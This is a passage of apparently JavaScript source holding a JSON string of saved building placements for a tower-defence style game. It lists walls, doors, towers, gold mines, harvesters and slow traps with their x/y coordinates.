"24457754\":{\"x\":-552,\"y\":408,\"type\":\"Door\"},\"24457755\":{\"x\":-504,\"y\":408,\"type\":\"Door\"},\"24457756\":{\"x\":-504,\"y\":456,\"type\":\"Door\"},\"24457757\":{\"x\":-456,\"y\":456,\"type\":\"Door\"},\"24457758\":{\"x\":-456,\"y\":504,\"type\":\"Door\"},\"24457759\":{\"x\":-504,\"y\":504,\"type\":\"Door\"},\"24457760\":{\"x\":-552,\"y\":456,\"type\":\"Door\"},\"24457761\":{\"x\":-360,\"y\":552,\"type\":\"Door\"},\"24457762\":{\"x\":-408,\"y\":552,\"type\":\"Door\"},\"24457763\":{\"x\":-408,\"y\":504,\"type\":\"Door\"},\"24457764\":{\"x\":-408,\"y\":456,\"type\":\"Door\"},\"24457765\":{\"x\":-360,\"y\":504,\"type\":\"Door\"},\"24457766\":{\"x\":-312,\"y\":504,\"type\":\"Door\"},\"24457767\":{\"x\":-600,\"y\":408,\"type\":\"Door\"},\"24457768\":{\"x\":-600,\"y\":-408,\"type\":\"Door\"},\"24457769\":{\"x\":600,\"y\":-408,\"type\":\"Door\"},\"24457772\":{\"x\":-216,\"y\":-24,\"type\":\"Wall\"},\"24457773\":{\"x\":-216,\"y\":24,\"type\":\"Wall\"},\"24457774\":{\"x\":216,\"y\":-24,\"type\":\"Wall\"},\"24457775\":{\"x\":216,\"y\":24,\"type\":\"Wall\"},\"24457778\":{\"x\":-168,\"y\":-24,\"type\":\"Door\"},\"24457779\":{\"x\":-168,\"y\":24,\"type\":\"Door\"},\"24457780\":{\"x\":168,\"y\":-24,\"type\":\"Door\"},\"24457781\":{\"x\":168,\"y\":24,\"type\":\"Door\"}}";
let xBase = "{\"31479106\":{\"x\":192,\"y\":-96,\"type\":\"GoldMine\"},\"31479129\":{\"x\":192,\"y\":0,\"type\":\"GoldMine\"},\"31479299\":{\"x\":48,\"y\":192,\"type\":\"GoldMine\"},\"31479318\":{\"x\":-48,\"y\":192,\"type\":\"ArrowTower\"},\"31479418\":{\"x\":192,\"y\":96,\"type\":\"BombTower\"},\"31479421\":{\"x\":-192,\"y\":96,\"type\":\"BombTower\"},\"31479424\":{\"x\":-192,\"y\":0,\"type\":\"BombTower\"},\"31479426\":{\"x\":-192,\"y\":-96,\"type\":\"BombTower\"},\"31479443\":{\"x\":-48,\"y\":-192,\"type\":\"BombTower\"},\"31479447\":{\"x\":48,\"y\":-192,\"type\":\"BombTower\"},\"31479448\":{\"x\":0,\"y\":-288,\"type\":\"BombTower\"},\"31479449\":{\"x\":96,\"y\":-288,\"type\":\"BombTower\"},\"31479450\":{\"x\":48,\"y\":-384,\"type\":\"BombTower\"},\"31479451\":{\"x\":144,\"y\":-384,\"type\":\"BombTower\"},\"31479452\":{\"x\":48,\"y\":-480,\"type\":\"BombTower\"},\"31479453\":{\"x\":144,\"y\":-480,\"type\":\"CannonTower\"},\"31479454\":{\"x\":240,\"y\":-432,\"type\":\"CannonTower\"},\"31479455\":{\"x\":144,\"y\":-576,\"type\":\"MagicTower\"},\"31479456\":{\"x\":240,\"y\":-528,\"type\":\"MagicTower\"},\"31479457\":{\"x\":336,\"y\":-480,\"type\":\"MagicTower\"},\"31479458\":{\"x\":-48,\"y\":-576,\"type\":\"MagicTower\"},\"31479459\":{\"x\":-144,\"y\":-576,\"type\":\"MagicTower\"},\"31479460\":{\"x\":-240,\"y\":-528,\"type\":\"MagicTower\"},\"31479461\":{\"x\":-336,\"y\":-480,\"type\":\"MagicTower\"},\"31479462\":{\"x\":48,\"y\":-576,\"type\":\"ArrowTower\"},\"31479463\":{\"x\":-480,\"y\":-336,\"type\":\"MagicTower\"},\"31479464\":{\"x\":-528,\"y\":-240,\"type\":\"MagicTower\"},\"31479465\":{\"x\":-576,\"y\":-144,\"type\":\"MagicTower\"},\"31479466\":{\"x\":-384,\"y\":-336,\"type\":\"CannonTower\"},\"31479467\":{\"x\":-432,\"y\":-240,\"type\":\"CannonTower\"},\"31479468\":{\"x\":-480,\"y\":-144,\"type\":\"CannonTower\"},\"31479469\":{\"x\":-384,\"y\":-144,\"type\":\"CannonTower\"},\"31479470\":{\"x\":-288,\"y\":-144,\"type\":\"CannonTower\"},\"31479471\":{\"x\":-336,\"y\":-240,\"type\":\"CannonTower\"},\"31479472\":{\"x\":-576,\"y\":-48,\"type\":\"CannonTower\"},\"31479473\":{\"x\":-480,\"y\":-48,\"type\":\"CannonTower\"},\"31479474\":{\"x\":-384,\"y\":-48,\"type\":\"ArrowTower\"},\"31479475\":{\"x\":-576,\"y\":48,\"type\":\"ArrowTower\"},\"31479476\":{\"x\":-240,\"y\":-432,\"type\":\"CannonTower\"},\"31479477\":{\"x\":-144,\"y\":-480,\"type\":\"CannonTower\"},\"31479478\":{\"x\":-48,\"y\":-480,\"type\":\"CannonTower\"},\"31479479\":{\"x\":-144,\"y\":-384,\"type\":\"CannonTower\"},\"31479480\":{\"x\":-192,\"y\":-288,\"type\":\"CannonTower\"},\"31479481\":{\"x\":-216,\"y\":-360,\"type\":\"Wall\"},\"31479482\":{\"x\":-48,\"y\":-384,\"type\":\"ArrowTower\"},\"31479483\":{\"x\":-96,\"y\":-288,\"type\":\"ArrowTower\"},\"31479484\":{\"x\":-288,\"y\":-48,\"type\":\"BombTower\"},\"31479485\":{\"x\":-288,\"y\":48,\"type\":\"BombTower\"},\"31479486\":{\"x\":-384,\"y\":48,\"type\":\"BombTower\"},\"31479487\":{\"x\":-480,\"y\":48,\"type\":\"GoldMine\"},\"31479488\":{\"x\":-480,\"y\":144,\"type\":\"ArrowTower\"},\"31479489\":{\"x\":-384,\"y\":144,\"type\":\"ArrowTower\"},\"31479490\":{\"x\":-288,\"y\":144,\"type\":\"ArrowTower\"},\"31479491\":{\"x\":-576,\"y\":144,\"type\":\"MagicTower\"},\"31479492\":{\"x\":-528,\"y\":240,\"type\":\"MagicTower\"},\"31479493\":{\"x\":-480,\"y\":336,\"type\":\"MagicTower\"},\"31479494\":{\"x\":-432,\"y\":240,\"type\":\"CannonTower\"},\"31479495\":{\"x\":-360,\"y\":216,\"type\":\"Wall\"},\"31479496\":{\"x\":-312,\"y\":216,\"type\":\"Wall\"},\"31479497\":{\"x\":-336,\"y\":288,\"type\":\"Harvester\"},\"31479498\":{\"x\":-408,\"y\":312,\"type\":\"SlowTrap\"},\"31479499\":{\"x\":-408,\"y\":360,\"type\":\"SlowTrap\"},\"31479500\":{\"x\":-432,\"y\":432,\"type\":\"Harvester\"},\"31479501\":{\"x\":-504,\"y\":408,\"type\":\"Wall\"},\"31479502\":{\"x\":-552,\"y\":312,\"type\":\"Wall\"},\"31479503\":{\"x\":-600,\"y\":216,\"type\":\"Wall\"},\"31479504\":{\"x\":-648,\"y\":120,\"type\":\"Wall\"},\"31479505\":{\"x\":-648,\"y\":72,\"type\":\"Wall\"},\"31479506\":{\"x\":-648,\"y\":24,\"type\":\"Wall\"},\"31479507\":{\"x\":-648,\"y\":-24,\"type\":\"Wall\"},\"31479508\":{\"x\":-648,\"y\":-72,\"type\":\"Wall\"},\"31479509\":{\"x\":-648,\"y\":-120,\"type\":\"Wall\"},\"31479510\":{\"x\":-552,\"y\":-312,\"type\":\"Wall\"},\"31479511\":{\"x\":-600,\"y\":-216,\"type\":\"Wall\"},\"31479512\":{\"x\":-504,\"y\":-408,\"type\":\"Wall\"},\"31479513\":{\"x\":-408,\"y\":-504,\"type\":\"Wall\"},\"31479514\":{\"x\":-312,\"y\":-552,\"type\":\"Wall\"},\"31479515\":{\"x\":-216,\"y\":-600,\"type\":\"Wall\"},\"31479516\":{\"x\":-120,\"y\":-648,\"type\":\"Wall\"},\"31479517\":{\"x\":-72,\"y\":-648,\"type\":\"Wall\"},\"31479518\":{\"x\":-24,\"y\":-648,\"type\":\"Wall\"},\"31479519\":{\"x\":24,\"y\":-648,\"type\":\"Wall\"},\"31479520\":{\"x\":72,\"y\":-648,\"type\":\"Wall\"},\"31479521\":{\"x\":120,\"y\":-648,\"type\":\"Wall\"},\"31479522\":{\"x\":216,\"y\":-600,\"type\":\"Wall\"},\"31479523\":{\"x\":312,\"y\":-552,\"type\":\"Wall\"},\"31479524\":{\"x\":408,\"y\":-504,\"type\":\"Wall\"},\"31479525\":{\"x\":504,\"y\":-408,\"type\":\"Wall\"},\"31479526\":{\"x\":552,\"y\":-312,\"type\":\"Wall\"},\"31479527\":{\"x\":600,\"y\":-216,\"type\":\"Wall\"},\"31479534\":{\"x\":600,\"y\":216,\"type\":\"Wall\"},\"31479535\":{\"x\":552,\"y\":312,\"type\":\"Wall\"},\"31479536\":{\"x\":504,\"y\":408,\"type\":\"Wall\"},\"31479537\":{\"x\":408,\"y\":504,\"type\":\"Wall\"},\"31479538\":{\"x\":312,\"y\":552,\"type\":\"Wall\"},\"31479560\":{\"x\":216,\"y\":600,\"type\":\"Wall\"},\"31479626\":{\"x\":120,\"y\":648,\"type\":\"Wall\"},\"31479627\":{\"x\":72,\"y\":648,\"type\":\"Wall\"},\"31479634\":{\"x\":24,\"y\":648,\"type\":\"Wall\"},\"31479635\":{\"x\":-24,\"y\":648,\"type\":\"Wall\"},\"31479653\":{\"x\":-72,\"y\":648,\"type\":\"Wall\"},\"31479730\":{\"x\":-120,\"y\":648,\"type\":\"Wall\"},\"31479907\":{\"x\":-216,\"y\":600,\"type\":\"Wall\"},\"31479991\":{\"x\":-312,\"y\":552,\"type\":\"Wall\"},\"31480078\":{\"x\":-408,\"y\":504,\"type\":\"Wall\"},\"31480508\":{\"x\":-336,\"y\":480,\"type\":\"MagicTower\"},\"31480575\":{\"x\":-240,\"y\":528,\"type\":\"MagicTower\"},\"31480604\":{\"x\":-144,\"y\":576,\"type\":\"MagicTower\"},\"31480694\":{\"x\":-336,\"y\":384,\"type\":\"CannonTower\"},\"31480718\":{\"x\":-240,\"y\":432,\"type\":\"CannonTower\"},\"31480809\":{\"x\":-240,\"y\":336,\"type\":\"CannonTower\"},\"31480857\":{\"x\":-144,\"y\":480,\"type\":\"CannonTower\"},\"31481210\":{\"x\":-144,\"y\":288,\"type\":\"ArrowTower\"},\"31481245\":{\"x\":-144,\"y\":384,\"type\":\"ArrowTower\"},\"31481414\":{\"x\":-48,\"y\":288,\"type\":\"BombTower\"},\"31481433\":{\"x\":-48,\"y\":384,\"type\":\"BombTower\"},\"31481448\":{\"x\":48,\"y\":384,\"type\":\"BombTower\"},\"31481459\":{\"x\":48,\"y\":288,\"type\":\"BombTower\"},\"31481587\":{\"x\":-48,\"y\":480,\"type\":\"ArrowTower\"},\"31481608\":{\"x\":-48,\"y\":576,\"type\":\"ArrowTower\"},\"31481620\":{\"x\":48,\"y\":576,\"type\":\"ArrowTower\"},\"31481691\":{\"x\":48,\"y\":480,\"type\":\"GoldMine\"},\"31481872\":{\"x\":144,\"y\":480,\"type\":\"GoldMine\"},\"31481932\":{\"x\":144,\"y\":576,\"type\":\"MeleeTower\"},\"31481953\":{\"x\":144,\"y\":384,\"type\":\"ArrowTower\"},\"31481954\":{\"x\":144,\"y\":288,\"type\":\"ArrowTower\"},\"31481955\":{\"x\":240,\"y\":432,\"type\":\"CannonTower\"},\"31481956\":{\"x\":336,\"y\":480,\"type\":\"MagicTower\"},\"31481957\":{\"x\":240,\"y\":528,\"type\":\"MagicTower\"},\"31481958\":{\"x\":216,\"y\":312,\"type\":\"Wall\"},\"31481959\":{\"x\":216,\"y\":360,\"type\":\"Wall\"},\"31481960\":{\"x\":-24,\"y\":72,\"type\":\"Door\"},\"31481961\":{\"x\":-24,\"y\":120,\"type\":\"Door\"},\"31481962\":{\"x\":-72,\"y\":120,\"type\":\"Door\"},\"31481963\":{\"x\":24,\"y\":120,\"type\":\"Door\"},\"31481964\":{\"x\":-72,\"y\":-24,\"type\":\"Door\"},\"31481965\":{\"x\":-120,\"y\":-24,\"type\":\"Door\"},\"31481966\":{\"x\":-120,\"y\":-72,\"type\":\"Door\"},\"31481967\":{\"x\":-120,\"y\":24,\"type\":\"Door\"},\"31481968\":{\"x\":24,\"y\":-72,\"type\":\"Door\"},\"31481969\":{\"x\":24,\"y\":-120,\"type\":\"Door\"},\"31481970\":{\"x\":-24,\"y\":-120,\"type\":\"Door\"},\"31481971\":{\"x\":72,\"y\":24,\"type\":\"Door\"},\"31481972\":{\"x\":120,\"y\":24,\"type\":\"Door\"},\"31481973\":{\"x\":120,\"y\":-24,\"type\":\"Door\"},\"31481974\":{\"x\":120,\"y\":72,\"type\":\"Door\"},\"31481975\":{\"x\":120,\"y\":-72,\"type\":\"Door\"},\"31481978\":{\"x\":-432,\"y\":-432,\"type\":\"Harvester\"},\"31481979\":{\"x\":-288,\"y\":-336,\"type\":\"Harvester\"},\"31481980\":{\"x\":432,\"y\":-432,\"type\":\"Harvester\"},\"31481981\":{\"x\":288,\"y\":-336,\"type\":\"Harvester\"},\"31481982\":{\"x\":432,\"y\":432,\"type\":\"Harvester\"},\"31481984\":{\"x\":288,\"y\":336,\"type\":\"Harvester\"},\"31481985\":{\"x\":312,\"y\":408,\"type\":\"SlowTrap\"},\"31481986\":{\"x\":360,\"y\":408,\"type\":\"SlowTrap\"},\"31481988\":{\"x\":-360,\"y\":-408,\"type\":\"SlowTrap\"},\"31481989\":{\"x\":-312,\"y\":-408,\"type\":\"SlowTrap\"},\"31481990\":{\"x\":-216,\"y\":264,\"type\":\"Door\"},\"31481991\":{\"x\":-168,\"y\":216,\"type\":\"Door\"},\"31481992\":{\"x\":-120,\"y\":216,\"type\":\"Door\"},\"31481993\":{\"x\":-168,\"y\":-216,\"type\":\"Door\"},\"31481994\":{\"x\":-120,\"y\":-216,\"type\":\"Door\"},\"31481995\":{\"x\":120,\"y\":-216,\"type\":\"Door\"},\"31481996\":{\"x\":168,\"y\":-216,\"type\":\"Door\"},\"31481997\":{\"x\":120,\"y\":216,\"type\":\"Door\"},\"31481998\":{\"x\":168,\"y\":216,\"type\":\"Door\"},\"31481999\":{\"x\":216,\"y\":264,\"type\":\"Door\"},\"31482000\":{\"x\":-264,\"y\":264,\"type\":\"SlowTrap\"},\"31482001\":{\"x\":-264,\"y\":216,\"type\":\"SlowTrap\"},\"31482002\":{\"x\":-216,\"y\":216,\"type\":\"SlowTrap\"},\"31482003\":{\"x\":-216,\"y\":168,\"type\":\"SlowTrap\"},\"31482004\":{\"x\":-168,\"y\":168,\"type\":\"SlowTrap\"},\"31482005\":{\"x\":-120,\"y\":168,\"type\":\"SlowTrap\"},\"31482006\":{\"x\":-120,\"y\":120,\"type\":\"SlowTrap\"},\"31482008\":{\"x\":-72,\"y\":72,\"type\":\"SlowTrap\"},\"31482009\":{\"x\":-72,\"y\":24,\"type\":\"SlowTrap\"},\"31482010\":{\"x\":-72,\"y\":-72,\"type\":\"SlowTrap\"},\"31482011\":{\"x\":-72,\"y\":-120,\"type\":\"SlowTrap\"},\"31482012\":{\"x\":-120,\"y\":-120,\"type\":\"SlowTrap\"},\"31482013\":{\"x\":-120,\"y\":-168,\"type\":\"SlowTrap\"},\"31482014\":{\"x\":-168,\"y\":-168,\"type\":\"SlowTrap\"},\"31482015\":{\"x\":-216,\"y\":-216,\"type\":\"SlowTrap\"},\"31482016\":{\"x\":-264,\"y\":-216,\"type\":\"SlowTrap\"},\"31482017\":{\"x\":-264,\"y\":-264,\"type\":\"SlowTrap\"},\"31482018\":{\"x\":-24,\"y\":-72,\"type\":\"SlowTrap\"},\"31482019\":{\"x\":-216,\"y\":-168,\"type\":\"SlowTrap\"},\"31482020\":{\"x\":-120,\"y\":72,\"type\":\"SlowTrap\"},\"31482021\":{\"x\":192,\"y\":-288,\"type\":\"ArrowTower\"},\"31482022\":{\"x\":216,\"y\":-216,\"type\":\"SlowTrap\"},\"31482023\":{\"x\":216,\"y\":-168,\"type\":\"SlowTrap\"},\"31482024\":{\"x\":168,\"y\":-168,\"type\":\"SlowTrap\"},\"31482025\":{\"x\":120,\"y\":-168,\"type\":\"SlowTrap\"},\"31482026\":{\"x\":120,\"y\":-120,\"type\":\"SlowTrap\"},\"31482027\":{\"x\":72,\"y\":-72,\"type\":\"SlowTrap\"},\"31482028\":{\"x\":72,\"y\":-24,\"type\":\"SlowTrap\"},\"31482029\":{\"x\":72,\"y\":-120,\"type\":\"SlowTrap\"},\"31482031\":{\"x\":24,\"y\":72,\"type\":\"SlowTrap\"},\"31482032\":{\"x\":72,\"y\":72,\"type\":\"SlowTrap\"},\"31482033\":{\"x\":72,\"y\":120,\"type\":\"SlowTrap\"},\"31482034\":{\"x\":120,\"y\":168,\"type\":\"SlowTrap\"},\"31482035\":{\"x\":168,\"y\":168,\"type\":\"SlowTrap\"},\"31482036\":{\"x\":216,\"y\":168,\"type\":\"SlowTrap\"},\"31482037\":{\"x\":216,\"y\":216,\"type\":\"SlowTrap\"},\"31482038\":{\"x\":384,\"y\":336,\"type\":\"MagicTower\"},\"31482039\":{\"x\":480,\"y\":336,\"type\":\"MagicTower\"},\"31482040\":{\"x\":528,\"y\":240,\"type\":\"MagicTower\"},\"31482041\":{\"x\":432,\"y\":240,\"type\":\"ArrowTower\"},\"31482042\":{\"x\":336,\"y\":240,\"type\":\"ArrowTower\"},\"31482043\":{\"x\":288,\"y\":144,\"type\":\"ArrowTower\"},\"31482045\":{\"x\":480,\"y\":144,\"type\":\"ArrowTower\"},\"31482046\":{\"x\":384,\"y\":144,\"type\":\"BombTower\"},\"31482047\":{\"x\":264,\"y\":216,\"type\":\"SlowTrap\"},\"31482048\":{\"x\":264,\"y\":264,\"type\":\"SlowTrap\"},\"31482049\":{\"x\":120,\"y\":120,\"type\":\"SlowTrap\"},\"31482050\":{\"x\":480,\"y\":-336,\"type\":\"MagicTower\"},\"31482051\":{\"x\":528,\"y\":-240,\"type\":\"MagicTower\"},\"31482052\":{\"x\":576,\"y\":-144,\"type\":\"MagicTower\"},\"31482053\":{\"x\":384,\"y\":-336,\"type\":\"CannonTower\"},\"31482054\":{\"x\":336,\"y\":-240,\"type\":\"CannonTower\"},\"31482055\":{\"x\":432,\"y\":-240,\"type\":\"CannonTower\"},\"31482056\":{\"x\":288,\"y\":-144,\"type\":\"ArrowTower\"},\"31482057\":{\"x\":384,\"y\":-144,\"type\":\"ArrowTower\"},\"31482058\":{\"x\":480,\"y\":-144,\"type\":\"BombTower\"},\"31482059\":{\"x\":480,\"y\":-48,\"type\":\"BombTower\"},\"31482060\":{\"x\":384,\"y\":-48,\"type\":\"BombTower\"},\"31482061\":{\"x\":288,\"y\":-48,\"type\":\"BombTower\"},\"31482062\":{\"x\":288,\"y\":48,\"type\":\"BombTower\"},\"31482063\":{\"x\":384,\"y\":48,\"type\":\"GoldMine\"},\"31482075\":{\"x\":480,\"y\":48,\"type\":\"GoldMine\"},\"31483933\":{\"x\":576,\"y\":144,\"type\":\"MeleeTower\"},\"31483982\":{\"x\":624,\"y\":0,\"type\":\"ArrowTower\"},\"31484360\":{\"x\":552,\"y\":-72,\"type\":\"Door\"},\"31484381\":{\"x\":600,\"y\":-72,\"type\":\"Door\"},\"31484387\":{\"x\":648,\"y\":-72,\"type\":\"Door\"},\"31484388\":{\"x\":696,\"y\":-72,\"type\":\"Door\"},\"31484425\":{\"x\":696,\"y\":-24,\"type\":\"Door\"},\"31484435\":{\"x\":696,\"y\":24,\"type\":\"Door\"},\"31484489\":{\"x\":696,\"y\":72,\"type\":\"Door\"},\"31484516\":{\"x\":648,\"y\":72,\"type\":\"Door\"},\"31484522\":{\"x\":600,\"y\":72,\"type\":\"Door\"},\"31484541\":{\"x\":552,\"y\":24,\"type\":\"Door\"},\"31484577\":{\"x\":552,\"y\":-24,\"type\":\"Door\"},\"31484620\":{\"x\":552,\"y\":72,\"type\":\"Door\"},\"31485071\":{\"x\":744,\"y\":-120,\"type\":\"Wall\"},\"31485091\":{\"x\":744,\"y\":-72,\"type\":\"Wall\"},\"31485092\":{\"x\":744,\"y\":-24,\"type\":\"Wall\"},\"31485111\":{\"x\":744,\"y\":24,\"type\":\"Wall\"},\"31485112\":{\"x\":744,\"y\":72,\"type\":\"Wall\"},\"31485157\":{\"x\":744,\"y\":120,\"type\":\"Wall\"},\"31485507\":{\"x\":696,\"y\":168,\"type\":\"Door\"},\"31485508\":{\"x\":696,\"y\":216,\"type\":\"Door\"},\"31485509\":{\"x\":648,\"y\":264,\"type\":\"Door\"},\"31485510\":{\"x\":648,\"y\":312,\"type\":\"Door\"},\"31485511\":{\"x\":600,\"y\":360,\"type\":\"Door\"},\"31485512\":{\"x\":552,\"y\":360,\"type\":\"Door\"},\"31485513\":{\"x\":552,\"y\":408,\"type\":\"Door\"},\"31485514\":{\"x\":600,\"y\":312,\"type\":\"Door\"},\"31485515\":{\"x\":600,\"y\":264,\"type\":\"Door\"},\"31485516\":{\"x\":648,\"y\":216,\"type\":\"Door\"},\"31485517\":{\"x\":648,\"y\":168,\"type\":\"Door\"},\"31485518\":{\"x\":648,\"y\":120,\"type\":\"Door\"},\"31485519\":{\"x\":696,\"y\":120,\"type\":\"Door\"},\"31485520\":{\"x\":648,\"y\":-168,\"type\":\"Door\"},\"31485521\":{\"x\":696,\"y\":-168,\"type\":\"Door\"},\"31485522\":{\"x\":696,\"y\":-120,\"type\":\"Door\"},\"31485523\":{\"x\":648,\"y\":-120,\"type\":\"Door\"},\"31485524\":{\"x\":552,\"y\":-408,\"type\":\"Door\"},\"31485525\":{\"x\":552,\"y\":-360,\"type\":\"Door\"},\"31485526\":{\"x\":600,\"y\":-360,\"type\":\"Door\"},\"31485530\":{\"x\":600,\"y\":-312,\"type\":\"Door\"},\"31485531\":{\"x\":648,\"y\":-312,\"type\":\"Door\"},\"31485532\":{\"x\":648,\"y\":-264,\"type\":\"Door\"},\"31485533\":{\"x\":600,\"y\":-264,\"type\":\"Door\"},\"31485534\":{\"x\":648,\"y\":-216,\"type\":\"Door\"},\"31485535\":{\"x\":696,\"y\":-216,\"type\":\"Door\"},\"31485536\":{\"x\":216,\"y\":-360,\"type\":\"Wall\"},\"31485537\":{\"x\":312,\"y\":-408,\"type\":\"SlowTrap\"},\"31485538\":{\"x\":360,\"y\":-408,\"type\":\"SlowTrap\"},\"31485539\":{\"x\":264,\"y\":-264,\"type\":\"SlowTrap\"},\"31485540\":{\"x\":264,\"y\":-216,\"type\":\"SlowTrap\"},\"31485541\":{\"x\":-408,\"y\":-552,\"type\":\"Door\"},\"31485542\":{\"x\":-360,\"y\":-552,\"type\":\"Door\"},\"31485543\":{\"x\":-360,\"y\":-600,\"type\":\"Door\"},\"31485544\":{\"x\":-312,\"y\":-600,\"type\":\"Door\"},\"31485545\":{\"x\":-264,\"y\":-600,\"type\":\"Door\"},\"31485546\":{\"x\":-264,\"y\":-648,\"type\":\"Door\"},\"31485547\":{\"x\":-312,\"y\":-648,\"type\":\"Door\"},\"31485548\":{\"x\":-216,\"y\":-648,\"type\":\"Door\"},\"31485549\":{\"x\":-168,\"y\":-648,\"type\":\"Door\"},\"31485550\":{\"x\":-168,\"y\":-696,\"type\":\"Door\"},\"31485551\":{\"x\":-216,\"y\":-696,\"type\":\"Door\"},\"31485563\":{\"x\":-120,\"y\":-696,\"type\":\"Door\"},\"31485565\":{\"x\":-72,\"y\":-696,\"type\":\"Door\"},\"31485566\":{\"x\":-24,\"y\":-696,\"type\":\"Door\"},\"31485567\":{\"x\":24,\"y\":-696,\"type\":\"Door\"},\"31485568\":{\"x\":72,\"y\":-696,\"type\":\"Door\"},\"31485569\":{\"x\":120,\"y\":-696,\"type\":\"Door\"},\"31485570\":{\"x\":168,\"y\":-696,\"type\":\"Door\"},\"31485571\":{\"x\":216,\"y\":-696,\"type\":\"Door\"},\"31485572\":{\"x\":216,\"y\":-648,\"type\":\"Door\"},\"31485573\":{\"x\":168,\"y\":-648,\"type\":\"Door\"},\"31485576\":{\"x\":264,\"y\":-648,\"type\":\"Door\"},\"31485577\":{\"x\":312,\"y\":-648,\"type\":\"Door\"},\"31485578\":{\"x\":312,\"y\":-600,\"type\":\"Door\"},\"31485579\":{\"x\":264,\"y\":-600,\"type\":\"Door\"},\"31485580\":{\"x\":360,\"y\":-600,\"type\":\"Door\"},\"31485581\":{\"x\":360,\"y\":-552,\"type\":\"Door\"},\"31485582\":{\"x\":408,\"y\":-552,\"type\":\"Door\"},\"31485584\":{\"x\":-552,\"y\":-408,\"type\":\"Door\"},\"31485585\":{\"x\":-552,\"y\":-360,\"type\":\"Door\"},\"31485586\":{\"x\":-600,\"y\":-360,\"type\":\"Door\"},\"31485587\":{\"x\":-648,\"y\":-312,\"type\":\"Door\"},\"31485588\":{\"x\":-600,\"y\":-312,\"type\":\"Door\"},\"31485589\":{\"x\":-600,\"y\":-264,\"type\":\"Door\"},\"31485590\":{\"x\":-648,\"y\":-264,\"type\":\"Door\"},\"31485591\":{\"x\":-696,\"y\":-216,\"type\":\"Door\"},\"31485592\":{\"x\":-648,\"y\":-216,\"type\":\"Door\"},\"31485593\":{\"x\":-648,\"y\":-168,\"type\":\"Door\"},\"31485594\":{\"x\":-696,\"y\":-168,\"type\":\"Door\"},\"31485595\":{\"x\":-696,\"y\":-120,\"type\":\"Door\"},\"31485596\":{\"x\":-696,\"y\":-72,\"type\":\"Door\"},\"31485597\":{\"x\":-696,\"y\":-24,\"type\":\"Door\"},\"31485598\":{\"x\":-696,\"y\":24,\"type\":\"Door\"},\"31485599\":{\"x\":-696,\"y\":72,\"type\":\"Door\"},\"31485600\":{\"x\":-696,\"y\":120,\"type\":\"Door\"},\"31485601\":{\"x\":-696,\"y\":168,\"type\":\"Door\"},\"31485602\":{\"x\":-696,\"y\":216,\"type\":\"Door\"},\"31485603\":{\"x\":-648,\"y\":216,\"type\":\"Door\"},\"31485604\":{\"x\":-648,\"y\":168,\"type\":\"Door\"},\"31485606\":{\"x\":-648,\"y\":264,\"type\":\"Door\"},\"31485607\":{\"x\":-600,\"y\":264,\"type\":\"Door\"},\"31485608\":{\"x\":-600,\"y\":312,\"type\":\"Door\"},\"31485609\":{\"x\":-648,\"y\":312,\"type\":\"Door\"},\"31485610\":{\"x\":-600,\"y\":360,\"type\":\"Door\"},\"31485612\":{\"x\":-552,\"y\":360,\"type\":\"Door\"},\"31485613\":{\"x\":-552,\"y\":408,\"type\":\"Door\"},\"31485615\":{\"x\":-408,\"y\":552,\"type\":\"Door\"},\"31485616\":{\"x\":-360,\"y\":552,\"type\":\"Door\"},\"31485617\":{\"x\":-360,\"y\":600,\"type\":\"Door\"},\"31485619\":{\"x\":-312,\"y\":600,\"type\":\"Door\"},\"31485620\":{\"x\":-264,\"y\":600,\"type\":\"Door\"},\"31485621\":{\"x\":-264,\"y\":648,\"type\":\"Door\"},\"31485622\":{\"x\":-312,\"y\":648,\"type\":\"Door\"},\"31485627\":{\"x\":-216,\"y\":648,\"type\":\"Door\"},\"31485629\":{\"x\":-168,\"y\":648,\"type\":\"Door\"},\"31485635\":{\"x\":-216,\"y\":696,\"type\":\"Door\"},\"31485636\":{\"x\":-168,\"y\":696,\"type\":\"Door\"},\"31485637\":{\"x\":-120,\"y\":696,\"type\":\"Door\"},\"31485638\":{\"x\":-72,\"y\":696,\"type\":\"Door\"},\"31485639\":{\"x\":-24,\"y\":696,\"type\":\"Door\"},\"31485640\":{\"x\":24,\"y\":696,\"type\":\"Door\"},\"31485641\":{\"x\":72,\"y\":696,\"type\":\"Door\"},\"31485642\":{\"x\":120,\"y\":696,\"type\":\"Door\"},\"31485643\":{\"x\":168,\"y\":696,\"type\":\"Door\"},\"31485644\":{\"x\":168,\"y\":648,\"type\":\"Door\"},\"31485649\":{\"x\":216,\"y\":648,\"type\":\"Door\"},\"31485650\":{\"x\":264,\"y\":648,\"type\":\"Door\"},\"31485651\":{\"x\":264,\"y\":600,\"type\":\"Door\"},\"31485652\":{\"x\":312,\"y\":600,\"type\":\"Door\"},\"31485653\":{\"x\":360,\"y\":600,\"type\":\"Door\"},\"31485654\":{\"x\":360,\"y\":552,\"type\":\"Door\"},\"31485655\":{\"x\":408,\"y\":552,\"type\":\"Door\"},\"31485661\":{\"x\":312,\"y\":648,\"type\":\"Door\"},\"31485666\":{\"x\":216,\"y\":696,\"type\":\"Door\"},\"31485673\":{\"x\":-120,\"y\":744,\"type\":\"Wall\"},\"31485674\":{\"x\":-72,\"y\":744,\"type\":\"Wall\"},\"31485675\":{\"x\":-24,\"y\":744,\"type\":\"Wall\"},\"31485677\":{\"x\":24,\"y\":744,\"type\":\"Wall\"},\"31485678\":{\"x\":72,\"y\":744,\"type\":\"Wall\"},\"31485680\":{\"x\":120,\"y\":744,\"type\":\"Wall\"},\"31485683\":{\"x\":-744,\"y\":-120,\"type\":\"Wall\"},\"31485684\":{\"x\":-744,\"y\":-72,\"type\":\"Wall\"},\"31485685\":{\"x\":-744,\"y\":-24,\"type\":\"Wall\"},\"31485686\":{\"x\":-744,\"y\":24,\"type\":\"Wall\"},\"31485687\":{\"x\":-744,\"y\":72,\"type\":\"Wall\"},\"31485688\":{\"x\":-120,\"y\":-744,\"type\":\"Wall\"},\"31485689\":{\"x\":-72,\"y\":-744,\"type\":\"Wall\"},\"31485690\":{\"x\":-24,\"y\":-744,\"type\":\"Wall\"},\"31485691\":{\"x\":24,\"y\":-744,\"type\":\"Wall\"},\"31485692\":{\"x\":72,\"y\":-744,\"type\":\"Wall\"},\"31485693\":{\"x\":120,\"y\":-744,\"type\":\"Wall\"}}";
